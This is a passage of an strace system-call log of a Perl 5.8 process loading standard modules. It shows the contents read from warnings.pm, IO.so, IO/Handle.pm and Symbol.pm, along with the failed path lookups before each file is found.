\'prototype\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\", # [35]\n    \'qw\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\", # [36]\n    \'recursion\'\t\t=> \"\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [18]\n    \'redefine\'\t\t=> \"\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [19]\n    \'regexp\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\", # [20]\n    \'reserved\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\", # [37]\n    \'semicolon\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\", # [38]\n    \'severe\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x54\\x05\\x00\\x00\\x00\\x00\\x00\", # [21..25]\n    \'signal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\", # [26]\n    \'substr\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x40", 4096) = 4096
6687  07:15:03.336900 brk(0x81b6000)    = 0x81b6000
6687  07:15:03.336917 brk(0x81b5000)    = 0x81b5000
6687  07:15:03.336996 read(8, "\\x00\\x00\\x00\\x00\\x00\", # [27]\n    \'syntax\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x55\\x55\\x15\\x00\\x00\", # [28..38]\n    \'taint\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\", # [39]\n    \'threads\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\", # [40]\n    \'uninitialized\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\", # [41]\n    \'unopened\'\t\t=> \"\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [11]\n    \'unpack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\", # [42]\n    \'untie\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\", # [43]\n    \'utf8\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\", # [44]\n    \'void\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\", # [45]\n    \'y2k\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\", # [46]\n  );\n\nour %DeadBits = (\n    \'all\'\t\t=> \"\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\x2a\", # [0..46]\n    \'ambiguous\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\", # [29]\n    \'bareword\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\", # [30]\n    \'closed\'\t\t=> \"\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [6]\n    \'closure\'\t\t=> \"\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [1]\n    \'debugging\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\", # [22]\n    \'deprecated\'\t=> \"\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [2]\n    \'digit\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\", # [31]\n    \'exec\'\t\t=> \"\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [7]\n    \'exiting\'\t\t=> \"\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [3]\n    \'glob\'\t\t=> \"\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [4]\n    \'inplace\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\", # [23]\n    \'internal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\", # [24]\n    \'io\'\t\t=> \"\\x00\\xa8\\xaa\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [5..11]\n    \'layer\'\t\t=> \"\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [8]\n    \'malloc\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\", # [25]\n    \'misc\'\t\t=> \"\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [12]\n    \'newline\'\t\t=> \"\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [9]\n    \'numeric\'\t\t=> \"\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [13]\n    \'once\'\t\t=> \"\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [14]\n    \'overflow\'\t\t=> \"\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [15]\n    \'pack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [16]\n    \'parenthesis\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\", # [32]\n    \'pipe\'\t\t=> \"\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [10]\n    \'portable\'\t\t=> \"\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [17]\n    \'precedence\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\", # [33]\n    \'printf\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\", # [34]\n    \'prototype\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\", # [35]\n    \'qw\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\", # [36]\n    \'recursion\'\t\t=> \"\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [18]\n    \'redefine\'\t\t=> \"\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [19]\n    \'regexp\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\", # [20]\n    \'reserved\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\", # [37]\n    \'semicolon\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\", # [38]\n    \'severe\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\xa8\\x0a\\x00\\x00\\x00\\x00\\x00\", # [21..25]\n    \'signal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\", # [26]\n    \'substr\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\", # [27]\n    \'syntax\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xaa\\xaa\\x2a\\x00\\x00\", # [28..38]\n    \'taint\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\", # [39]\n    \'threads\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\", # [40]\n    \'uninitialized\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\", # [41]\n    \'unopened\'\t\t=> \"\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [11]\n    \'unpack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\", 4096) = 4096
6687  07:15:03.337455 read(8, "x00\\x20\\x00\", # [42]\n    \'untie\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\", # [43]\n    \'utf8\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\", # [44]\n    \'void\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\", # [45]\n    \'y2k\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\", # [46]\n  );\n\n$NONE     = \"\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\";\n$LAST_BIT = 94 ;\n$BYTES    = 12 ;\n\n$All = \"\" ; vec($All, $Offsets{\'all\'}, 2) = 3 ;\n\nsub Croaker\n{\n    local $Carp::CarpInternal{\'warnings\'};\n    delete $Carp::CarpInternal{\'warnings\'};\n    Carp::croak(@_);\n}\n\nsub bits\n{\n    # called from B::Deparse.pm\n\n    push @_, \'all\' unless @_;\n\n    my $mask;\n    my $catmask ;\n    my $fatal = 0 ;\n    my $no_fatal = 0 ;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    $fatal = 1;\n\t    $no_fatal = 0;\n\t}\n\telsif ($word eq \'NONFATAL\') {\n\t    $fatal = 0;\n\t    $no_fatal = 1;\n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask |= $catmask ;\n\t    $mask |= $DeadBits{$word} if $fatal ;\n\t    $mask &= ~($DeadBits{$word}|$All) if $no_fatal ;\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    return $mask ;\n}\n\nsub import \n{\n    shift;\n\n    my $catmask ;\n    my $fatal = 0 ;\n    my $no_fatal = 0 ;\n\n    my $mask = ${^WARNING_BITS} ;\n\n    if (vec($mask, $Offsets{\'all\'}, 1)) {\n        $mask |= $Bits{\'all\'} ;\n        $mask |= $DeadBits{\'all\'} if vec($mask, $Offsets{\'all\'}+1, 1);\n    }\n    \n    push @_, \'all\' unless @_;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    $fatal = 1;\n\t    $no_fatal = 0;\n\t}\n\telsif ($word eq \'NONFATAL\') {\n\t    $fatal = 0;\n\t    $no_fatal = 1;\n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask |= $catmask ;\n\t    $mask |= $DeadBits{$word} if $fatal ;\n\t    $mask &= ~($DeadBits{$word}|$All) if $no_fatal ;\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    ${^WARNING_BITS} = $mask ;\n}\n\nsub unimport \n{\n    shift;\n\n    my $catmask ;\n    my $mask = ${^WARNING_BITS} ;\n\n    if (vec($mask, $Offsets{\'all\'}, 1)) {\n        $mask |= $Bits{\'all\'} ;\n        $mask |= $DeadBits{\'all\'} if vec($mask, $Offsets{\'all\'}+1, 1);\n    }\n\n    push @_, \'all\' unless @_;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    next; \n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask &= ~($catmask | $DeadBits{$word} | $All);\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    ${^WARNING_BITS} = $mask ;\n}\n\nmy %builtin_type; @builtin_type{qw(SCALAR ARRAY HASH CODE REF GLOB LVALUE Regexp)} = ();\n\nsub __chk\n{\n    my $category ;\n    my $offset ;\n    my $isobj = 0 ;\n\n    if (@_) {\n        # check the category supplied.\n        $category = shift ;\n        if (my $type = ref $category) {\n            Croaker(\"not an object\")\n                if exists $builtin_type{$type};\n\t    $category = $type;\n            $isobj = 1 ;\n        }\n        $offset = $Offsets{$category};\n        Croaker(\"Unknown warnings category \'$category\'\")\n\t    unless defined $offset;\n    }\n    else {\n        $category = (caller(1))[0] ;\n        $offset = $Offsets{$category};\n        Croaker(\"package \'$category\' not registered for warnings\")\n\t    unless defined $offset ;\n    }\n\n    my $this_pkg = (caller(1))[0] ;\n    my $i = 2 ;\n    my $pkg ;\n\n    if ($isobj) {\n        while (do { { package DB; $pkg = (caller($i++))[0] } } ) {\n            last unless @DB::args && $DB::args[0] =~ /^$category=/ ;\n        }\n\t$i -= 2 ;\n    }\n    else {\n        for ($i = 2 ; $pkg = (caller($i))[0] ; ++ $i) {\n            last if $pkg ne $this_pkg ;\n        }\n        $i = 2\n            if !$pkg || $pkg eq $this_pkg ;\n    }\n\n    my $callers_bitmask = (caller($i))[9] ;\n    return ($callers_bitmask, $offset, $i) ;\n}\n\nsub enabled\n{\n    Croaker(\"Usage: warnings::enabled([category])\")\n\tunless @_ == 1 || @_ == 0 ;\n\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n\n    return 0 unless defined $callers_bitmask ;\n    return vec($callers_bitmask, $offset, 1) ||\n           vec($callers_bitmask, $Offsets{\'all\'}, 1) ;\n}\n\nsub warn\n{\n    Croaker(\"Usage: warnings::warn([category,] \'message\')\")\n\tunless @_ == 2 || @_ == 1 ;\n\n    my $me", 4096) = 4096
6687  07:15:03.338155 read(8, "ssage = pop ;\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n    Carp::croak($message)\n\tif vec($callers_bitmask, $offset+1, 1) ||\n\t   vec($callers_bitmask, $Offsets{\'all\'}+1, 1) ;\n    Carp::carp($message) ;\n}\n\nsub warnif\n{\n    Croaker(\"Usage: warnings::warnif([category,] \'message\')\")\n\tunless @_ == 2 || @_ == 1 ;\n\n    my $message = pop ;\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n\n    return\n        unless defined $callers_bitmask &&\n            \t(vec($callers_bitmask, $offset, 1) ||\n            \tvec($callers_bitmask, $Offsets{\'all\'}, 1)) ;\n\n    Carp::croak($message)\n\tif vec($callers_bitmask, $offset+1, 1) ||\n\t   vec($callers_bitmask, $Offsets{\'all\'}+1, 1) ;\n\n    Carp::carp($message) ;\n}\n\n1;\n# ex: set ro:\n", 4096) = 730
6687  07:15:03.338168 read(8, "", 4096) = 0
6687  07:15:03.338168 close(8)          = 0
6687  07:15:03.338186 _llseek(6, 412, [412], SEEK_SET) = 0
6687  07:15:03.338202 _llseek(6, 0, [412], SEEK_CUR) = 0
6687  07:15:03.338212 close(6)          = 0
6687  07:15:03.338255 stat64("/usr/lib/perl/5.8/auto/IO/IO.so", {st_mode=S_IFREG|0644, st_size=15580, ...}) = 0
6687  07:15:03.338279 stat64("/usr/lib/perl/5.8/auto/IO/IO.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
6687  07:15:03.338306 futex(0xb7f88070, 0x81 /* FUTEX_??? */, 2147483647) = 0
6687  07:15:03.338362 open("/usr/lib/perl/5.8/auto/IO/IO.so", O_RDONLY) = 6
6687  07:15:03.338378 read(6, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000\22\0\0004\0\0\0\0349\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\2006\0\0\2006\0\0\5\0\0\0\0\20\0\0\1\0\0\0\2006\0\0\200F\0\0\200F\0\0\360\1\0\0\364\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\2246\0\0\224F\0\0\224F\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0C\0\0\0E\0\0\0\0\0\0\0\t\0\0\0\3\0\0\0D\0\0\0\"\0\0\0009\0\0\0\0\0\0\0#\0\0\0\0\0\0\0%\0\0\0:\0\0\0\4\0\0\0001\0\0\0\37\0\0\0;\0\0\0\30\0\0\0+\0\0\0\23\0\0\0\n\0\0\0000\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\16\0\0\0\0\0\0\0004\0\0\0\0\0\0\0\0\0\0\0008\0\0\0\32\0\0\0\0\0\0\0\0\0\0\0?\0\0\0)\0\0\0\10\0\0\0.\0\0\0\26\0\0\0!\0\0\0\21\0\0\0(\0\0\0&\0\0\0-\0\0\0\0\0\0\0\0\0\0\0/\0\0\0\0\0\0\0\0\0\0\0$\0\0\0006\0\0\0\24\0\0\0A\0\0\0\0\0\0\0\27\0\0\0@\0\0\0\0\0\0\0\5\0\0\0\0\0\0\0\0\0\0\0\33\0\0\0\17\0\0\0002\0\0\0\22\0\0\0>\0\0\0\'\0\0\0\36\0\0\0*\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0007\0\0\0\0\0\0\0\7\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
6687  07:15:03.338486 fstat64(6, {st_mode=S_IFREG|0644, st_size=15580, ...}) = 0
6687  07:15:03.338512 mmap2(NULL, 18548, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 6, 0) = 0xb7f8c000
6687  07:15:03.338525 mmap2(0xb7f90000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 6, 0x3) = 0xb7f90000
6687  07:15:03.338539 close(6)          = 0
6687  07:15:03.338668 stat64("/etc/perl/IO/Handle.pmc", 0xbfdadafc) = -1 ENOENT (No such file or directory)
6687  07:15:03.338684 stat64("/etc/perl/IO/Handle.pm", 0xbfdada0c) = -1 ENOENT (No such file or directory)
6687  07:15:03.338698 stat64("/usr/local/lib/perl/5.8.8/IO/Handle.pmc", 0xbfdadafc) = -1 ENOENT (No such file or directory)
6687  07:15:03.338711 stat64("/usr/local/lib/perl/5.8.8/IO/Handle.pm", 0xbfdada0c) = -1 ENOENT (No such file or directory)
6687  07:15:03.338725 stat64("/usr/local/share/perl/5.8.8/IO/Handle.pmc", 0xbfdadafc) = -1 ENOENT (No such file or directory)
6687  07:15:03.338738 stat64("/usr/local/share/perl/5.8.8/IO/Handle.pm", 0xbfdada0c) = -1 ENOENT (No such file or directory)
6687  07:15:03.338752 stat64("/usr/lib/perl5/IO/Handle.pmc", 0xbfdadafc) = -1 ENOENT (No such file or directory)
6687  07:15:03.338764 stat64("/usr/lib/perl5/IO/Handle.pm", 0xbfdada0c) = -1 ENOENT (No such file or directory)
6687  07:15:03.338778 stat64("/usr/share/perl5/IO/Handle.pmc", 0xbfdadafc) = -1 ENOENT (No such file or directory)
6687  07:15:03.338790 stat64("/usr/share/perl5/IO/Handle.pm", 0xbfdada0c) = -1 ENOENT (No such file or directory)
6687  07:15:03.338803 stat64("/usr/lib/perl/5.8/IO/Handle.pmc", 0xbfdadafc) = -1 ENOENT (No such file or directory)
6687  07:15:03.338912 stat64("/usr/lib/perl/5.8/IO/Handle.pm", {st_mode=S_IFREG|0644, st_size=7592, ...}) = 0
6687  07:15:03.338936 open("/usr/lib/perl/5.8/IO/Handle.pm", O_RDONLY|O_LARGEFILE) = 6
6687  07:15:03.338965 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfdad818) = -1 ENOTTY (Inappropriate ioctl for device)
6687  07:15:03.338976 _llseek(6, 0, [0], SEEK_CUR) = 0
6687  07:15:03.338993 read(6, "package IO::Handle;\n\nuse 5.006_001;\nuse strict;\nour($VERSION, @EXPORT_OK, @ISA);\nuse Carp;\nuse Symbol;\nuse SelectSaver;\nuse IO ();\t# Load the XS module\n\nrequire Exporter;\n@ISA = qw(Exporter);\n\n$VERSION = \"1.25\";\n$VERSION = eval $VERSION;\n\n@EXPORT_OK = qw(\n    autoflush\n    output_field_separator\n    output_record_separator\n    input_record_separator\n    input_line_number\n    format_page_number\n    format_lines_per_page\n    format_lines_left\n    format_name\n    format_top_name\n    format_line_break_characters\n    format_formfeed\n    format_write\n\n    print\n    printf\n    getline\n    getlines\n\n    printflush\n    flush\n\n    SEEK_SET\n    SEEK_CUR\n    SEEK_END\n    _IOFBF\n    _IOLBF\n    _IONBF\n);\n\n################################################\n## Constructors, destructors.\n##\n\nsub new {\n    my $class = ref($_[0]) || $_[0] || \"IO::Handle\";\n    @_ == 1 or croak \"usage: new $class\";\n    my $io = gensym;\n    bless $io, $class;\n}\n\nsub new_from_fd {\n    my $class = ref($_[0]) || $_[0] || \"IO::Handle\";\n    @_ == 3 or croak \"usage: new_from_fd $class FD, MODE\";\n    my $io = gensym;\n    shift;\n    IO::Handle::fdopen($io, @_)\n\tor return undef;\n    bless $io, $class;\n}\n\n#\n# There is no need for DESTROY to do anything, because when the\n# last reference to an IO object is gone, Perl automatically\n# closes its associated files (if any).  However, to avoid any\n# attempts to autoload DESTROY, we here define it to do nothing.\n#\nsub DESTROY {}\n\n################################################\n## Open and close.\n##\n\nsub _open_mode_string {\n    my ($mode) = @_;\n    $mode =~ /^\\+?(<|>>?)$/\n      or $mode =~ s/^r(\\+?)$/$1</\n      or $mode =~ s/^w(\\+?)$/$1>/\n      or $mode =~ s/^a(\\+?)$/$1>>/\n      or croak \"IO::Handle: bad open mode: $mode\";\n    $mode;\n}\n\nsub fdopen {\n    @_ == 3 or croak \'usage: $io->fdopen(FD, MODE)\';\n    my ($io, $fd, $mode) = @_;\n    local(*GLOB);\n\n    if (ref($fd) && \"\".$fd =~ /GLOB\\(/o) {\n\t# It\'s a glob reference; Alias it as we cannot get name of anon GLOBs\n\tmy $n = qualify(*GLOB);\n\t*GLOB = *{*$fd};\n\t$fd =  $n;\n    } elsif ($fd =~ m#^\\d+$#) {\n\t# It\'s an FD number; prefix with \"=\".\n\t$fd = \"=$fd\";\n    }\n\n    open($io, _open_mode_string($mode) . \'&\' . $fd)\n\t? $io : undef;\n}\n\nsub close {\n    @_ == 1 or croak \'usage: $io->close()\';\n    my($io) = @_;\n\n    close($io);\n}\n\n################################################\n## Normal I/O functions.\n##\n\n# flock\n# select\n\nsub opened {\n    @_ == 1 or croak \'usage: $io->opened()\';\n    defined fileno($_[0]);\n}\n\nsub fileno {\n    @_ == 1 or croak \'usage: $io->fileno()\';\n    fileno($_[0]);\n}\n\nsub getc {\n    @_ == 1 or croak \'usage: $io->getc()\';\n    getc($_[0]);\n}\n\nsub eof {\n    @_ == 1 or croak \'usage: $io->eof()\';\n    eof($_[0]);\n}\n\nsub print {\n    @_ or croak \'usage: $io->print(ARGS)\';\n    my $this = shift;\n    print $this @_;\n}\n\nsub printf {\n    @_ >= 2 or croak \'usage: $io->printf(FMT,[ARGS])\';\n    my $this = shift;\n    printf $this @_;\n}\n\nsub getline {\n    @_ == 1 or croak \'usage: $io->getline()\';\n    my $this = shift;\n    return scalar <$this>;\n} \n\n*gets = \\&getline;  # deprecated\n\nsub getlines {\n    @_ == 1 or croak \'usage: $io->getlines()\';\n    wantarray or\n\tcroak \'Can\\\'t call $io->getlines in a scalar context, use $io->getline\';\n    my $this = shift;\n    return <$this>;\n}\n\nsub truncate {\n    @_ == 2 or croak \'usage: $io->truncate(LEN)\';\n    truncate($_[0], $_[1]);\n}\n\nsub read {\n    @_ == 3 || @_ == 4 or croak \'usage: $io->read(BUF, LEN [, OFFSET])\';\n    read($_[0], $_[1], $_[2], $_[3] || 0);\n}\n\nsub sysread {\n    @_ == 3 || @_ == 4 or croak \'usage: $io->sysread(BUF, LEN [, OFFSET])\';\n    sysread($_[0], $_[1], $_[2], $_[3] || 0);\n}\n\nsub write {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $io->write(BUF [, LEN [, OFFSET]])\';\n    local($\\) = \"\";\n    $_[2] = length($_[1]) unless defined $_[2];\n    print { $_[0] } substr($_[1], $_[3] || 0, $_[2]);\n}\n\nsub syswrite {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $io->syswrite(BUF [, LEN [, OFFSET]])\';\n    if (defined($_[2])) {\n\tsyswrite($_[0], $_[1], $_[2], $_[3] || 0);\n    } else {\n\tsyswrite($_[0], $_[1]);\n    }\n}\n\nsub stat {\n    @_ == 1 or croak \'u", 4096) = 4096
6687  07:15:03.339341 stat64("/etc/perl/Symbol.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.339360 stat64("/etc/perl/Symbol.pm", 0xbfdad55c) = -1 ENOENT (No such file or directory)
6687  07:15:03.339374 stat64("/usr/local/lib/perl/5.8.8/Symbol.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.339388 stat64("/usr/local/lib/perl/5.8.8/Symbol.pm", 0xbfdad55c) = -1 ENOENT (No such file or directory)
6687  07:15:03.339402 stat64("/usr/local/share/perl/5.8.8/Symbol.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.339415 stat64("/usr/local/share/perl/5.8.8/Symbol.pm", 0xbfdad55c) = -1 ENOENT (No such file or directory)
6687  07:15:03.339430 stat64("/usr/lib/perl5/Symbol.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.339442 stat64("/usr/lib/perl5/Symbol.pm", 0xbfdad55c) = -1 ENOENT (No such file or directory)
6687  07:15:03.339455 stat64("/usr/share/perl5/Symbol.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.339485 stat64("/usr/share/perl5/Symbol.pm", 0xbfdad55c) = -1 ENOENT (No such file or directory)
6687  07:15:03.339499 stat64("/usr/lib/perl/5.8/Symbol.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.339511 stat64("/usr/lib/perl/5.8/Symbol.pm", 0xbfdad55c) = -1 ENOENT (No such file or directory)
6687  07:15:03.339525 stat64("/usr/share/perl/5.8/Symbol.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.339537 stat64("/usr/share/perl/5.8/Symbol.pm", {st_mode=S_IFREG|0644, st_size=2099, ...}) = 0
6687  07:15:03.339558 open("/usr/share/perl/5.8/Symbol.pm", O_RDONLY|O_LARGEFILE) = 8
6687  07:15:03.339573 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfdad368) = -1 ENOTTY (Inappropriate ioctl for device)
6687  07:15:03.339584 _llseek(8, 0, [0], SEEK_CUR) = 0
6687  07:15:03.339602 read(8, "package Symbol;\n\nBEGIN { require 5.005; }\n\nrequire Exporter;\n@ISA = qw(Exporter);\n@EXPORT = qw(gensym ungensym qualify qualify_to_ref);\n@EXPORT_OK = qw(delete_package geniosym);\n\n$VERSION = \'1.06\';\n\nmy $genpkg = \"Symbol::\";\nmy $genseq = 0;\n\nmy %global = map {$_ => 1} qw(ARGV ARGVOUT ENV INC SIG STDERR STDIN STDOUT);\n\n#\n# Note that we never _copy_ the glob; we just make a ref to it.\n# If we did copy it, then SVf_FAKE would be set on the copy, and\n# glob-specific behaviors (e.g. C<*$ref = \\&func>) wouldn\'t work.\n#\nsub gensym () {\n    my $name = \"GEN\" . $genseq++;\n    my $ref = \\*{$genpkg . $name};\n    delete $$genpkg{$name};\n    $ref;\n}\n\nsub geniosym () {\n    my $sym = gensym();\n    # force the IO slot to be filled\n    select(select $sym);\n    *$sym{IO};\n}\n\nsub ungensym ($) {}\n\nsub qualify ($;$) {\n    my ($name) = @_;\n    if (!ref($name) && index($name, \'::\') == -1 && index($name, \"\'\") == -1) {\n\tmy $pkg;\n\t# Global names: special character, \"^xyz\", or other. \n\tif ($name =~ /^(([^a-z])|(\\^[a-z_]+))\\z/i || $global{$name}) {\n\t    # RGS 2001-11-05 : translate leading ^X to control-char\n\t    $name =~ s/^\\^([a-z_])/\'qq(\\c\'.$1.\')\'/eei;\n\t    $pkg = \"main\";\n\t}\n\telse {\n\t    $pkg = (@_ > 1) ? $_[1] : caller;\n\t}\n\t$name = $pkg . \"::\" . $name;\n    }\n    $name;\n}\n\nsub qualify_to_ref ($;$) {\n    return \\*{ qualify $_[0], @_ > 1 ? $_[1] : caller };\n}\n\n#\n# of Safe.pm lineage\n#\nsub delete_package ($) {\n    my $pkg = shift;\n\n    # expand to full symbol table name if needed\n\n    unless ($pkg =~ /^main::.*::$/) {\n        $pkg = \"main$pkg\"\tif\t$pkg =~ /^::/;\n        $pkg = \"main::$pkg\"\tunless\t$pkg =~ /^main::/;\n        $pkg .= \'::\'\t\tunless\t$pkg =~ /::$/;\n    }\n\n    my($stem, $leaf) = $pkg =~ m/(.*::)(\\w+::)$/;\n    my $stem_symtab = *{$stem}{HASH};\n    return unless defined $stem_symtab and exists 